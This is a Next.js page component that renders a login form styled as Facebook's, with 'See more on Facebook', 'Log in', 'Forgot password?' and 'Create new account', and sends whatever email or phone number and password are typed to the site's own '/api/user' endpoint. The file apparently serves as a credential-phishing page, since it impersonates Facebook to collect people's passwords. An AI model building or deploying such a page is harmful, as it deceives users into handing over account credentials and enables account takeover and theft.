'use client'

import Image from "next/image";
import React, { useState} from "react";

const Home: React.FC = () => {

  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    const resp = await fetch('/api/user', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({phone, password})
    })

    const data = await resp.json()

    if(resp.ok){
      setPassword('')
      setPhone('')
    }
    else{
      console.log(data.error)
    }
    
  }

  return (
    <div className="w-screen h-screen fixed">
      <div className="z-0">
        <Image
          src="/gere.jpg"
          alt="gere"
          fill={true}
          className="contrast-50"
        />
      </div>
      <div className="z-1 absolute rounded-3xl ">
        <Image
          src='/etugen.jpg'
          alt="et"
          height={100}
          width={120}
          className="rounded-[50%] ml-[33vw] mt-[20px] contrast-50"
        />
      </div>
      <div className="h-[300px] w-[280px] text-black p-[15px] bg-white absolute top-1/2 left-1/2 z-10 transform -translate-x-1/2 -translate-y-1/2 rounded-lg shadow-xl ">
          <p className="text-black font-bold text-lg mt-[20px] ml-[35px]">See more on Facebook</p>
          <div className="flex flex-col mt-[10px]">
            <form onSubmit={handleSubmit} className="flex flex-col">
            <input 
              type="text" 
              name="phone" 
              value={phone}
              onChange={(e) => setPhone(e.target.value)} 
              className="h-[32px] border-none rounded-md bg-sky-100 pl-[10px] pt-[15px]"
              required
            />
            <p className="font-thin absolute text-[10px] text-gray-800 mt-[3px] ml-[10px]">Email or phone number</p>
            <input 
              type="password" 
              name="phone" 
              className="h-[32px] border-none rounded-md bg-sky-100 mt-[6px] pt-[15px] pl-[10px]"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />  
            <p className="font-thin absolute text-[10px] text-gray-800 mt-[40px] ml-[10px]">Password</p>
            <input 
              type="submit" 
              className="border border-slate-800 cursor-pointer rounded-md bg-blue-600 text-white text-sm p-[4px] mt-[10px] border-none"
              value="Log in"
            />
            </form>
            <p className="text-blue-700 text-xs font-semibold ml-[30%] mt-[8px]">Forgot password?</p>
            <div className="flex relative ml-[3px] mt-[18px]">
              <div className="border-t w-[43%] border-neutral-800"></div>
              <div className="w-[40px] text-center mt-[-10px] text-xs">or</div>
              <div className="border-t border-neutral-800 w-[43%]"></div>
            </div>
            <button className="border-none bg-green-700 w-[60%] text-sm text-white py-[4px] px-[7px] rounded-md ml-[20%] mt-[10px]">Create new account</button>
          </div>
      </div>
    </div>
  );
}

export default Home;